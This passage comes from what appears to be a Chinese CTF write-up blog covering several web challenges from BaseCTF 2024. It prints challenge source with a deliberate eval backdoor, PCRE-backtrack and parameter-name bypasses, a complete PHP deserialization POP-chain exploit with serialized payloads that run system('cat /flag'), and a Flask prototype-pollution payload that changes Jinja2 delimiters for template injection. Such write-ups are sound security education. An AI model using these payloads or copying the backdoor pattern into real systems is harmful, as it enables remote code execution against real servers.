class="hljs-variable">$emp</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">114514</span>)<br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$emp</span>);<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$emp</span>[<span class="hljs-variable">$i</span>]))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你不是hacker？那请去外场等候！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;只有真正的hacker才能拿到flag！&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?HACKER/is&#x27;</span>,<span class="hljs-variable">$try</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你是hacker还敢自报家门呢？&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$try</span>,<span class="hljs-string">&#x27;HACKER&#x27;</span>) === <span class="hljs-literal">TRUE</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你连自己是hacker都不承认，还想要flag呢？&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$b</span>,<span class="hljs-string">&#x27;php&#x27;</span>)!==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;收手吧hacker，你得不到flag的！&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> (<span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>))-&gt;<span class="hljs-variable">$c</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;114514到底是啥意思嘞？。？&quot;</span>);<br>&#125;<br><span class="hljs-comment"># 觉得困难的话就直接把shell拿去用吧，不用谢~</span><br><span class="hljs-variable">$shell</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第一层对emp进行传值，用小数点就可以绕过，注意php特性</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">e[m.p=114514.111<br></code></pre></td></tr></table></figure><p>第二层非贪婪绕过，可以去看看p神的文章，了解一下原理，<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html?page=2#:~:text=PHP%E4%B8%BA%E4%BA%86%E9%98%B2%E6%AD%A2%E6%AD%A3">PHP利用PCRE回溯次数限制绕过某些安全限制</a>,只需要给HACKER前面加100w个就行了(ps：我没测最小值需要多少，直接量大管饱了)post发包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1000000</span>+ <span class="hljs-string">b&#x27;HACKER&#x27;</span><br><br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure><p>第三层进行原生类的读取，简要的介绍gpt来写</p><p><code>SplFileObject</code> 是 PHP 的一个内置类，继承自 <code>SplFileInfo</code>，用于处理文件的读写操作。它提供了许多方法来操作文件，类似于文件处理的面向对象接口。</p><p>使用 <code>SplFileObject</code> 的常见方法：</p><ul><li><strong><code>fgets()</code></strong>: 读取文件的一行。</li><li><strong><code>fwrite()</code></strong>: 写入内容到文件。</li><li><strong><code>fgetc()</code></strong>: 读取文件的一个字符。</li></ul><p><code>php://stdin</code> 是一个 PHP 的流包装器，表示标准输入流。这通常用于从命令行或其他输入流读取数据。</p><ul><li><strong><code>php://stdin</code></strong> 允许你读取从标准输入传入的数据，例如，通过命令行管道传递的数据。</li></ul><p><code>fgets()</code> 是 <code>SplFileObject</code> 提供的一个方法，用于从文件中读取一行。结合 <code>php://stdin</code>，它可以读取从标准输入传入的数据。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=SplFileObject&amp;b=php://stdin&amp;c=fgets<br></code></pre></td></tr></table></figure><p>最后在post后面执行<code>system('cat flag.php');</code>就可以得到flag，看源码</p><h3 id="ez_php"><a class="markdownIt-Anchor" href="#ez_php"></a> ez_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;hacker&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$start</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;start=<span class="hljs-variable">$start</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">&quot;hacker&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;end = <span class="hljs-variable language_">$this</span>-&gt;start;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfer/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;username))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacker！&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;c-&gt;<span class="hljs-title function_ invoke__">c</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;C&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t-&gt;t;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;f-&gt;f);<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;e)();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$r</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;r);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ez_ser.from_you&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ctf</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hacker</span>(<span class="hljs-string">&#x27;&#123;&#123;&#123;&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ez_ser.from_you&#x27;</span>].<span class="hljs-string">&#x27;&#125;&#125;&#125;&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\[|\]/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;substr&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$pre</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;substr&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;substr&#x27;</span>]:<span class="hljs-string">&quot;substr&quot;</span>;<br>    <span class="hljs-variable">$ser_ctf</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$pre</span>.<span class="hljs-string">&quot;[&quot;</span>.<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$ctf</span>).<span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser_ctf</span>);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;杂鱼~杂鱼~&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>晨曦✌出的太狠了，简单的先分析一下pop链，一下是依次触发的情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Hacker::__destruct =&gt; C::__toString =&gt; T::__call =&gt; F::__get =&gt; E::__isset =&gt; R::__invoke<br></code></pre></td></tr></table></figure><p>接着考虑绕过__wakeup,使用&amp;进行引用就可以绕过</p><p>需要注意的是由于最后有<code>throw new Exception(&quot;杂鱼~杂鱼~&quot;);</code>让__destruct不能正常触发，需要使用gc回收机制，参考<a href="https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem%3DDRDj2QDgGuQ7TQ4D&amp;u_atoken=0114403acb8b70492b4c518ca47812ae&amp;u_asig=1a0c380917263902773186410e0107">GC回收机制</a>,</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;hacker&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">&quot;hacker&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;end = <span class="hljs-variable language_">$this</span>-&gt;start;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfer/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;username))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacker！&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;c-&gt;<span class="hljs-title function_ invoke__">c</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;C&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t-&gt;t;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;f-&gt;f);<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;e)();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$r</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;r);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$exp</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hacker</span>();<br><span class="hljs-variable">$exp</span>-&gt;end=&amp;<span class="hljs-variable">$exp</span>-&gt;username;<br><span class="hljs-variable">$exp</span>-&gt;start=<span class="hljs-keyword">new</span> C;<br><span class="hljs-variable">$exp</span>-&gt;start-&gt;c=<span class="hljs-keyword">new</span> T;<br><span class="hljs-variable">$exp</span>-&gt;start-&gt;c-&gt;t=<span class="hljs-keyword">new</span> F;<br><span class="hljs-variable">$exp</span>-&gt;start-&gt;c-&gt;t-&gt;f=<span class="hljs-keyword">new</span> E;<br><span class="hljs-variable">$exp</span>-&gt;start-&gt;c-&gt;t-&gt;f-&gt;e=<span class="hljs-keyword">new</span> R;<br><span class="hljs-variable">$exp</span>-&gt;start-&gt;c-&gt;t-&gt;f-&gt;e-&gt;r=<span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>;<br><span class="hljs-variable">$orange</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;1&#x27;</span>=&gt;<span class="hljs-variable">$exp</span>,<span class="hljs-string">&#x27;2&#x27;</span>=&gt;<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$orange</span>);<br></code></pre></td></tr></table></figure><p>得到的答案需要在本地测试一下前面的内容</p><p><img src="/../../images/basectf/basectf2024/ez.png" alt="ez"></p><p>然后前面的需要进行字符串逃逸，这里不再赘婿，可以看我<a href="https://0ran9ewww.github.io/2024/08/28/nepctf/nepctf2024/#PHP-MASTER">文章</a>,</p><p><img src="/../../images/basectf/basectf2024/ez-1.png" alt="ez-1"></p><p>测出长度是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?substr=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%9f<br>&amp;ez[ser.from_you=a:2:&#123;i:1;O:6:<span class="hljs-string">&quot;Hacker&quot;</span>:3:&#123;s:5:<span class="hljs-string">&quot;start&quot;</span>;O:1:<span class="hljs-string">&quot;C&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;c&quot;</span>;O:1:<span class="hljs-string">&quot;T&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;t&quot;</span>;O:1:<span class="hljs-string">&quot;F&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;f&quot;</span>;O:1:<span class="hljs-string">&quot;E&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;e&quot;</span>;O:1:<span class="hljs-string">&quot;R&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;r&quot;</span>;s:15:<span class="hljs-string">&quot;system(&#x27;ls /&#x27;);&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:3:<span class="hljs-string">&quot;end&quot;</span>;s:6:<span class="hljs-string">&quot;hacker&quot;</span>;s:8:<span class="hljs-string">&quot;username&quot;</span>;R:9;&#125;i:1;N;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?substr=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%9f<br>&amp;ez[ser.from_you=a:2:&#123;i:1;O:6:<span class="hljs-string">&quot;Hacker&quot;</span>:3:&#123;s:5:<span class="hljs-string">&quot;start&quot;</span>;O:1:<span class="hljs-string">&quot;C&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;c&quot;</span>;O:1:<span class="hljs-string">&quot;T&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;t&quot;</span>;O:1:<span class="hljs-string">&quot;F&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;f&quot;</span>;O:1:<span class="hljs-string">&quot;E&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;e&quot;</span>;O:1:<span class="hljs-string">&quot;R&quot;</span>:1:&#123;s:1:<span class="hljs-string">&quot;r&quot;</span>;s:20:<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:3:<span class="hljs-string">&quot;end&quot;</span>;s:6:<span class="hljs-string">&quot;hacker&quot;</span>;s:8:<span class="hljs-string">&quot;username&quot;</span>;R:9;&#125;i:1;N;&#125;<br></code></pre></td></tr></table></figure><p>cx师傅又让我学到了</p><h3 id="jinja-mark"><a class="markdownIt-Anchor" href="#jinja-mark"></a> Jinja Mark</h3><p>在/flag里面可以fuzz一下得到提示,不确定这个是动态还是静态的，最好自己bp跑一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lucky_number=5346<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">BLACKLIST_IN_index = [<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/magic&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pollute</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> request.is_json:<br>            merge(json.loads(request.data), instance)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;这个魔术还行吧&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我要json的魔术&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;记得用POST方法把魔术交上来&quot;</span><br></code></pre></td></tr></table></figure><p>得到了提示，index禁用了花括号，然后这是一个python原生类的题目~暂时没思路了，是要通过原生类进行ssti，还是通过这个进行简单的花括号绕过呢</p><p>续言：没错就是进行简单的花括号绕过，用其他代替就好了<code>jinja_env</code> 配置了 Jinja2 的模板引擎环境，通过修改 <code>variable_start_string</code> 和 <code>variable_end_string</code> 来控制模板变量的起始和结束符号。只是我知识面比较窄而已，利用post发包</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;app&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;jinja_env&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;variable_start_string&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&lt;&lt;&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;variable_end_string&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&gt;&gt;&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td 